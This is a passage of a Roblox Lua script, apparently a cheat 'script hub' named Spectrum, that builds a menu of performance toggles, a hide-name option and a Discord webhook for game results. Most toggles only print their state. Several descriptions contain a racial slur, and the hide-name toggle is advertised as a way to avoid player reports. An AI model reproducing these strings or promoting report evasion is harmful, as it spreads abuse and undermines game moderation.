                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, goodserver)
            end
        end
    }
)

local White =
    Tabs.Misc:AddToggle(
    "White",
    {Title = "White Screen Mode", Description = "Reduce GPU/CPU Very Recommend!", Default = false}
)

White:OnChanged(
    function()
        print("lol", Options.White.Value)
    end
)

Options.White:SetValue(false)

local Black =
    Tabs.Misc:AddToggle(
    "Black",
    {
        Title = "Black Screen Mode",
        Description = "Too same with White Screen but VERY COOL and Easy on the eyes",
        Default = false
    }
)

Black:OnChanged(
    function()
        print("lol", Options.Black.Value)
    end
)

Options.Black:SetValue(false)

local name =
    Tabs.Misc:AddToggle(
    "name",
    {
        Title = "Hide Name",
        Description = "people can't see your name that good for protect your form report nigga",
        Default = false
    }
)

name:OnChanged(
    function()
        print("lol", Options.name.Value)
    end
)

Options.name:SetValue(false)

local rtx = Tabs.Misc:AddToggle("rtx", {Title = "FPS Booster (1000 FPS++)", Default = false})

rtx:OnChanged(
    function()
        print("lol", Options.rtx.Value)
    end
)

Options.rtx:SetValue(false)

local smooth =
    Tabs.Misc:AddToggle(
    "smooth",
    {
        Title = "Smooth Graphics (Like FREE FIRE :D)",
        Description = "you wanna play free fire on roblox right? enable this function nigga",
        Default = false
    }
)

smooth:OnChanged(
    function()
        print("lol", Options.smooth.Value)
    end
)

Options.name:SetValue(false)

local SetFPS =
    Tabs.Misc:AddDropdown(
    "SetFPS",
    {
        Title = "Set FPS (Very Recommend!)",
        Values = {"10", "30", "60", "120", "200", "300"},
        Multi = false,
        Default = 300
    }
)

local Webhook = Tabs.Webhook:AddSection("Webhook Features")


Tabs.Webhook:AddParagraph(
    {
        Title = "How to use Webhooks?",
        Content = "this very ez just copy discord webhook url and paste on here and enter you can get notify form Spectrum if you end game we got your Result Notification"
    }
)

local Input =
    Tabs.Webhook:AddInput(
    "Input",
    {
        Title = "Webhooks URL",
        Default = "",
        Placeholder = "Url Here...",
        Numeric = false, -- Only allows numbers
        Finished = false, -- Only calls callback when you press enter
        Callback = function(Value)
            print("Input changed:", Value)
        end
    }
)

Tabs.Webhook:AddButton(
    {
        Title = "Check Webhook",
        Description = "test your webhook for sure this working!",
        Callback = function()
            Window:Dialog(
                {
                    Title = "Test Webhook",
                    Content = "hey nigga you wanna test webhook right?",
                    Buttons = {
                        {
                            Title = "Sure",
                            Callback = function()
                                print("Confirmed the dialog.")
                            end
                        },
                        {
                            Title = "Cancel",
                            Callback = function()
                                print("Cancelled the dialog.")
                            end
                        }
                    }
                }
            )
        end
    }
)

local Toggle =
    Tabs.Webhook:AddToggle(
    "MyToggle",
    {
        Title = "Send Webhook",
        Description = "Send Result Notification after game end don't care you win or lose",
        Default = false
    }
)

Toggle:OnChanged(
    function()
        print("lol", Options.MyToggle.Value)
    end
)

-- Settings

local note1 = Tabs.Settings:AddSection("Note")

Tabs.Settings:AddParagraph(
    {
        Title = "Hey READ THIS!",
        Content = "If you have some Feedback or Request For me\n Just Join Discord and let do that Thank you 🤝"
    }
)

SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)


SaveManager:IgnoreThemeSettings()

SaveManager:SetIgnoreIndexes({})

Window:SelectTab(1)


SaveManager:LoadAutoloadConfig()


InterfaceManager:SetFolder("FluentScriptHub")
SaveManager:SetFolder("FluentScriptHub/specific-game")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)


Window:SelectTab(1)

SaveManager:LoadAutoloadConfig()

    end
